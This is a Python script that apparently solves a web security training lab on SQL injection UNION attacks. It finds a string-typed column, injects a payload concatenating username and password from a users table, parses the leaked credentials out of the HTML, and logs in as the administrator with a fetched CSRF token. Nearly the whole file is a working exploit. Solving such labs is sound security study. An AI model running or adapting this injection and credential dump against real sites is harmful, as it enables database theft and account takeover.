#!/usr/bin/env python3
"""SQL injection UNION attack, retrieving multiple values in a single column"""

from typing import List

import bs4

import lab_09

class Lab(lab_09.Lab):
    """Wrapper"""

    @staticmethod
    def parse_html_user_list_table(response_text: str) -> List["Lab.User"]:
        """Parse usernames and passwords from HTML"""
        username_pw = []
        soup = bs4.BeautifulSoup(response_text, features="lxml")
        table = soup.find("table", attrs={"class": "is-table-list"})
        rows = table.tbody.find_all("tr")
        for row in rows:
            username_pw.append(Lab.User(*row.th.text.split("~", maxsplit=1)))
        return username_pw

def main() -> None:
    """Entry point"""
    site = Lab(key="category", path="/filter")
    if site.columns_of_string_type() != [1]:
        raise RuntimeError(f"Expected [1]; got {site.columns_of_string_type()}")

    response = site.dump_table(["NULL", "username||'~'||password"],
                               table="users")
    users = site.parse_html_user_list_table(response.text)
    admin = [user for user in users if user.name == "administrator"][0]

    csrf = site.csrf_token("/login")
    response = site.login(admin.name, admin.password, csrf=csrf)
    response.raise_for_status()
    print(response.status_code)

if __name__ == "__main__":
    main()
